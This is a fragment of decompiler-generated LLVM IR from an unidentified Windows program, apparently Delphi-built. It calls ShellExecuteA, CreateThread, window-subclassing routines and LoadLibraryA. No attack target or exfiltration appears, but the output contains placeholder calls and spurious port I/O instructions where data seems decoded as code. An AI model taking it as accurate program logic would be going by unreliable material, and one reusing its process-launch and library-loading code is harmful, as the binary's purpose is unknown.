  %42 = inttoptr i32 %41 to i32*, !insn.addr !1489
  store i32 %40, i32* %42, align 4, !insn.addr !1489
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1490
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1491
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1491
  store i32 0, i32* %45, align 4, !insn.addr !1491
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1492
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1492
  store i32 0, i32* %47, align 4, !insn.addr !1492
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1493
  %49 = call i32 @function_4036c8(), !insn.addr !1494
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1495
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1495
  store i32 %49, i32* %51, align 4, !insn.addr !1495
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1496
  %53 = call i32 @function_4065e4(), !insn.addr !1497
  %54 = call i32 @function_4036c8(), !insn.addr !1498
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1499
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1499
  store i32 %54, i32* %56, align 4, !insn.addr !1499
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1500
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1500
  store i32 0, i32* %58, align 4, !insn.addr !1500
  %59 = call i32 @function_4065dc(), !insn.addr !1501
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1502
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1502
  store i32 1, i32* %61, align 4, !insn.addr !1502
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1503
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1503
  store i32 0, i32* %63, align 4, !insn.addr !1503
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1504
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1504
  store i32 0, i32* %65, align 4, !insn.addr !1504
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1505
  %67 = call i32 @function_4036c8(), !insn.addr !1506
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1507
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1507
  store i32 %67, i32* %69, align 4, !insn.addr !1507
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1508
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1508
  store i32 ptrtoint ([5 x i8]* @global_var_406834 to i32), i32* %71, align 4, !insn.addr !1508
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1509
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1509
  store i32 0, i32* %73, align 4, !insn.addr !1509
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1510
  %75 = load i32, i32* %73, align 4, !insn.addr !1511
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1512
  store i32 4220934, i32* %69, align 4, !insn.addr !1513
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1514
  ret i32 %76, !insn.addr !1515
}

define i32 @function_4067ff() local_unnamed_addr {
dec_label_pc_4067ff:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1516
  ret i32 %0, !insn.addr !1516
}

define i32 @function_406804() local_unnamed_addr {
dec_label_pc_406804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1517
}

define i32 @function_406806(i32 %arg1) local_unnamed_addr {
dec_label_pc_406806:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1518
}

define i32 @function_40682b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40682b:
  %esp.1.reg2mem = alloca i32, !insn.addr !1519
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1519
  %ecx.0.reg2mem = alloca i32, !insn.addr !1519
  %esp.0.reg2mem = alloca i32, !insn.addr !1519
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1519
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1519
  store i32 %5, i32* %6, align 4, !insn.addr !1519
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1520
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1520
  %11 = add i8 %8, %10, !insn.addr !1520
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1520
  store i8 %11, i8* %12, align 1, !insn.addr !1520
  %13 = add i32 %2, 58, !insn.addr !1521
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1521
  %15 = load i8, i8* %14, align 1, !insn.addr !1521
  %16 = load i32, i32* %eax, align 4, !insn.addr !1521
  %17 = udiv i32 %16, 256, !insn.addr !1521
  %18 = trunc i32 %17 to i8, !insn.addr !1521
  %19 = add i8 %15, %18, !insn.addr !1521
  store i8 %19, i8* %14, align 1, !insn.addr !1521
  %20 = add i32 %0, 112, !insn.addr !1522
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1522
  %22 = load i8, i8* %21, align 1, !insn.addr !1522
  %23 = trunc i32 %4 to i8, !insn.addr !1522
  %24 = add i8 %22, %23, !insn.addr !1522
  store i8 %24, i8* %21, align 1, !insn.addr !1522
  %25 = trunc i32 %3 to i16, !insn.addr !1523
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1523
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1523
  %27 = load i8, i8* %7, align 4, !insn.addr !1524
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1524
  %30 = add i8 %27, %29, !insn.addr !1524
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1524
  store i8 %30, i8* %31, align 1, !insn.addr !1524
  %32 = load i8, i8* %7, align 4, !insn.addr !1525
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1525
  %35 = add i8 %32, %34, !insn.addr !1525
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1525
  store i8 %35, i8* %36, align 1, !insn.addr !1525
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1526
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1527
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1527
  br label %dec_label_pc_406844, !insn.addr !1527

dec_label_pc_406844:                              ; preds = %dec_label_pc_406844, %dec_label_pc_40682b
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1528
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1528
  store i32 0, i32* %39, align 4, !insn.addr !1528
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1529
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1529
  store i32 0, i32* %41, align 4, !insn.addr !1529
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1530
  %43 = icmp eq i32 %42, 0, !insn.addr !1530
  %44 = icmp eq i1 %43, false, !insn.addr !1531
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1531
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1531
  br i1 %44, label %dec_label_pc_406844, label %dec_label_pc_40684b, !insn.addr !1531

dec_label_pc_40684b:                              ; preds = %dec_label_pc_406844
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1532
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1532
  store i32 0, i32* %46, align 4, !insn.addr !1532
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1533
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1533
  store i32 %37, i32* %48, align 4, !insn.addr !1533
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1534
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1534
  store i32 4221664, i32* %50, align 4, !insn.addr !1534
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1535
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1535
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1535
  store i32 %51, i32* %53, align 4, !insn.addr !1535
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1536
  %54 = call i32 @"@LStrPos"(), !insn.addr !1537
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1538
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1538
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1538
  store i32 %57, i32* %56, align 4, !insn.addr !1538
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1539
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1540
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1540
  store i32 %61, i32* %60, align 4, !insn.addr !1540
  %62 = call i32 @function_4034c8(), !insn.addr !1541
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1542
  %64 = add i32 %arg1, -1, !insn.addr !1543
  store i32 %64, i32* %eax, align 4, !insn.addr !1543
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406ac5 [
    i32 0, label %dec_label_pc_4068bd
    i32 1, label %dec_label_pc_4069fd
    i32 2, label %dec_label_pc_406a6b
  ]

dec_label_pc_4068bd:                              ; preds = %dec_label_pc_40684b
  %65 = call i32 @function_4034c8(), !insn.addr !1544
  %66 = icmp slt i32 %65, 5, !insn.addr !1545
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1545
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1545
  br i1 %66, label %dec_label_pc_406ac5, label %dec_label_pc_4068ce, !insn.addr !1545

dec_label_pc_4068ce:                              ; preds = %dec_label_pc_4068bd
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1546
  %68 = call i32 @function_4065e4(), !insn.addr !1547
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1548
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1548
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1549
  %72 = call i32 @function_4065e4(), !insn.addr !1550
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1551
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1551
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1552
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1552
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1552
  store i32 %75, i32* %77, align 4, !insn.addr !1552
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1553
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1553
  store i32 ptrtoint (i32* @global_var_406b04 to i32), i32* %79, align 4, !insn.addr !1553
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1554
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1554
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1554
  store i32 %80, i32* %82, align 4, !insn.addr !1554
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1555
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1556
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1556
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1557
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1557
  store i32 4221712, i32* %87, align 4, !insn.addr !1557
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1558
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1558
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1558
  store i32 %88, i32* %90, align 4, !insn.addr !1558
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1559
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1559
  store i32 4221728, i32* %92, align 4, !insn.addr !1559
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1560
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1560
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1560
  store i32 %93, i32* %95, align 4, !insn.addr !1560
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1561
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1561
  store i32 4221744, i32* %97, align 4, !insn.addr !1561
  %98 = call i32 @function_407988(), !insn.addr !1562
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1563
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1563
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1564
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1565
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1565
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1566
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1566
  store i32 %106, i32* %105, align 4, !insn.addr !1566
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1567
  %108 = call i32 @function_4065e4(), !insn.addr !1568
  %109 = call i32 @"@LStrPos"(), !insn.addr !1569
  %110 = add i32 %109, -1, !insn.addr !1570
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1571
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1571
  store i32 %110, i32* %112, align 4, !insn.addr !1571
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1572
  %114 = call i32 @function_4065e4(), !insn.addr !1573
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1574
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1575
  store i32 %116, i32* %112, align 4, !insn.addr !1576
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1577
  %118 = call i32 @function_4065e4(), !insn.addr !1578
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1579
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1579
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1580
  %122 = call i32 @function_4065e4(), !insn.addr !1581
  %123 = call i32 @function_405c6c(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1582
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1583
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1583
  br label %dec_label_pc_406ac5, !insn.addr !1583

dec_label_pc_4069fd:                              ; preds = %dec_label_pc_40684b
  %124 = call i32 @function_4034c8(), !insn.addr !1584
  %125 = icmp slt i32 %124, 5, !insn.addr !1585
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1585
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1585
  br i1 %125, label %dec_label_pc_406ac5, label %dec_label_pc_406a0e, !insn.addr !1585

dec_label_pc_406a0e:                              ; preds = %dec_label_pc_4069fd
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1586
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1586
  store i32 ptrtoint ([5 x i8]* @global_var_406b50 to i32), i32* %127, align 4, !insn.addr !1586
  %128 = call i32 @function_404ae8(), !insn.addr !1587
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1588
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1588
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1589
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1589
  store i32 ptrtoint ([7 x i8]* @global_var_406b60 to i32), i32* %132, align 4, !insn.addr !1589
  %133 = call i32 @function_404ae8(), !insn.addr !1590
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1591
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1592
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1593
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1593
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1594
  %140 = call i32 @function_4065e4(), !insn.addr !1595
  %141 = call i32 @function_404c40(), !insn.addr !1596
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1597
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1597
  br label %dec_label_pc_406ac5, !insn.addr !1597

dec_label_pc_406a6b:                              ; preds = %dec_label_pc_40684b
  %142 = call i32 @function_4034c8(), !insn.addr !1598
  %143 = icmp slt i32 %142, 5, !insn.addr !1599
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1599
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1599
  br i1 %143, label %dec_label_pc_406ac5, label %dec_label_pc_406a78, !insn.addr !1599

dec_label_pc_406a78:                              ; preds = %dec_label_pc_406a6b
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1600
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1600
  store i32 ptrtoint ([5 x i8]* @global_var_406b50 to i32), i32* %145, align 4, !insn.addr !1600
  %146 = call i32 @function_404ae8(), !insn.addr !1601
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1602
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1602
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1603
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1603
  store i32 ptrtoint ([7 x i8]* @global_var_406b60 to i32), i32* %150, align 4, !insn.addr !1603
  %151 = call i32 @function_404ae8(), !insn.addr !1604
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1605
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1606
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1607
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1607
  %157 = call i32 @function_4065e4(), !insn.addr !1608
  %158 = call i32 @function_404c40(), !insn.addr !1609
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1609
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1609
  br label %dec_label_pc_406ac5, !insn.addr !1609

dec_label_pc_406ac5:                              ; preds = %dec_label_pc_40684b, %dec_label_pc_406a78, %dec_label_pc_406a6b, %dec_label_pc_406a0e, %dec_label_pc_4069fd, %dec_label_pc_4068ce, %dec_label_pc_4068bd
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1610
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1610
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1611
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1612
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1613
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1613
  store i32 4221671, i32* %163, align 4, !insn.addr !1613
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1614
  ret i32 %164, !insn.addr !1615
}

define i32 @function_406ae0() local_unnamed_addr {
dec_label_pc_406ae0:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1616
  ret i32 %0, !insn.addr !1616
}

define i32 @function_406ae5() local_unnamed_addr {
dec_label_pc_406ae5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1617
}

define i32 @function_406ae7(i32 %arg1) local_unnamed_addr {
dec_label_pc_406ae7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1618
}

define i32 @function_406b13() local_unnamed_addr {
dec_label_pc_406b13:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1619
}

define i32 @function_406b1b() local_unnamed_addr {
dec_label_pc_406b1b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1620
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1620
  store i32 %1, i32* %2, align 4, !insn.addr !1620
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1621
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1621
  %7 = add i8 %4, %6, !insn.addr !1621
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1621
  store i8 %7, i8* %8, align 1, !insn.addr !1621
  %9 = load i8, i8* %3, align 4, !insn.addr !1622
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1622
  %12 = trunc i32 %11 to i8, !insn.addr !1622
  %13 = add i8 %9, %12, !insn.addr !1622
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1622
  store i8 %13, i8* %14, align 1, !insn.addr !1622
  %15 = load i32, i32* %eax, align 4, !insn.addr !1623
  ret i32 %15, !insn.addr !1623
}

define i32 @function_406b22() local_unnamed_addr {
dec_label_pc_406b22:
  %0 = call i32 @function_406b60(), !insn.addr !1624
  ret i32 %0, !insn.addr !1624
}

define i32 @function_406b5e() local_unnamed_addr {
dec_label_pc_406b5e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1625
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1625
  store i8 %2, i8* %3, align 1, !insn.addr !1625
  ret i32 %0, !insn.addr !1625
}

define i32 @function_406b60() local_unnamed_addr {
dec_label_pc_406b60:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_406bc4, label %dec_label_pc_406b63, !insn.addr !1626

dec_label_pc_406b63:                              ; preds = %dec_label_pc_406b60
  %5 = icmp eq i1 %4, false, !insn.addr !1627
  br i1 %5, label %dec_label_pc_406bd8, label %dec_label_pc_406b65, !insn.addr !1627

dec_label_pc_406b65:                              ; preds = %dec_label_pc_406b63
  ret i32 %2, !insn.addr !1628

dec_label_pc_406bc4:                              ; preds = %dec_label_pc_406b60
  %6 = call i32 @function_4045ac(), !insn.addr !1629
  br label %dec_label_pc_406bd8, !insn.addr !1630

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406bc4, %dec_label_pc_406b63
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1631
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1632
  %9 = add i32 %0, 20, !insn.addr !1633
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1633
  %11 = load i32, i32* %10, align 4, !insn.addr !1633
  %12 = add i32 %0, 16, !insn.addr !1634
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1634
  %14 = load i32, i32* %13, align 4, !insn.addr !1634
  %15 = add i32 %0, 8, !insn.addr !1635
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1635
  %17 = load i32, i32* %16, align 4, !insn.addr !1635
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1636
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1636
  ret i32 %19, !insn.addr !1637
}

define i32 @function_406c10() local_unnamed_addr {
dec_label_pc_406c10:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1638
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1638
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221844 to i32*), i32 -4, i32 %3), !insn.addr !1639
  ret i32 %4, !insn.addr !1640
}

define i32 @function_406c45(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406c45:
  %merge.reg2mem = alloca i32, !insn.addr !1641
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1641
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1641
  store i8 %3, i8* %4, align 1, !insn.addr !1641
  %5 = add i32 %1, 114, !insn.addr !1642
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1642
  %7 = load i8, i8* %6, align 1, !insn.addr !1642
  %8 = udiv i32 %0, 256, !insn.addr !1642
  %9 = trunc i32 %8 to i8, !insn.addr !1642
  %10 = add i8 %7, %9, !insn.addr !1642
  store i8 %10, i8* %6, align 1, !insn.addr !1642
  %11 = add i8 %2, -32, !insn.addr !1643
  %12 = icmp ult i8 %2, 32, !insn.addr !1643
  %13 = icmp eq i8 %11, 0, !insn.addr !1643
  %14 = zext i8 %11 to i32, !insn.addr !1643
  %15 = and i32 %1, -256, !insn.addr !1643
  %16 = or i32 %15, %14, !insn.addr !1643
  %17 = or i1 %12, %13, !insn.addr !1644
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1644
  br i1 %17, label %dec_label_pc_406c4e, label %dec_label_pc_406cbd, !insn.addr !1644

dec_label_pc_406c4e:                              ; preds = %dec_label_pc_406c45
  %18 = add i32 %16, 105, !insn.addr !1645
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1645
  %20 = load i8, i8* %19, align 1, !insn.addr !1645
  %21 = and i8 %20, %9, !insn.addr !1645
  store i8 %21, i8* %19, align 1, !insn.addr !1645
  %22 = trunc i32 %arg3 to i16, !insn.addr !1646
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1646
  %24 = load i8, i8* %23, align 1, !insn.addr !1646
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1646
  %25 = add i32 %arg5, 105, !insn.addr !1647
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1647
  %28 = load i8, i8* %27, align 1, !insn.addr !1647
  %29 = udiv i32 %arg2, 256, !insn.addr !1647
  %30 = trunc i32 %29 to i8, !insn.addr !1647
  %31 = and i8 %28, %30, !insn.addr !1647
  store i8 %31, i8* %27, align 1, !insn.addr !1647
  %32 = mul i32 %arg5, 2, !insn.addr !1648
  %33 = add i32 %arg2, 115, !insn.addr !1648
  %34 = add i32 %33, %32, !insn.addr !1648
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1648
  %36 = load i8, i8* %35, align 1, !insn.addr !1648
  %37 = trunc i32 %arg2 to i8, !insn.addr !1648
  %38 = add i8 %36, %37, !insn.addr !1648
  %39 = icmp eq i8 %38, 0, !insn.addr !1648
  store i8 %38, i8* %35, align 1, !insn.addr !1648
  br i1 %39, label %dec_label_pc_406c9f, label %dec_label_pc_406c5d, !insn.addr !1649

dec_label_pc_406c5d:                              ; preds = %dec_label_pc_406c4e
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1650
  %41 = load i32, i32* %40, align 4, !insn.addr !1650
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1650
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1651
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1651
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1651
  %45 = icmp eq i32* %43, null, !insn.addr !1652
  %46 = icmp eq i1 %45, false, !insn.addr !1653
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1653
  br i1 %46, label %dec_label_pc_406cbd, label %dec_label_pc_406c81, !insn.addr !1653

dec_label_pc_406c81:                              ; preds = %dec_label_pc_406c5d
  %47 = call i32 @function_406c10(), !insn.addr !1654
  %48 = call i32 @function_4036c8(), !insn.addr !1655
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1656
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1657
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1657
  ret i32 %51, !insn.addr !1658

dec_label_pc_406c9f:                              ; preds = %dec_label_pc_406c4e
  %52 = call i32 @__asm_insd(i16 %22), !insn.addr !1659
  %53 = inttoptr i32 %arg7 to i32*, !insn.addr !1659
  store i32 %52, i32* %53, align 4, !insn.addr !1659
  %54 = add i32 %arg1, 1, !insn.addr !1660
  %55 = add i32 %29, %54, !insn.addr !1661
  %56 = and i32 %55, 216, !insn.addr !1661
  %57 = and i32 %54, -1946157312, !insn.addr !1661
  %58 = or i32 %56, %57, !insn.addr !1661
  ret i32 %58, !insn.addr !1662

dec_label_pc_406cbd:                              ; preds = %dec_label_pc_406c5d, %dec_label_pc_406c45
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1662
}

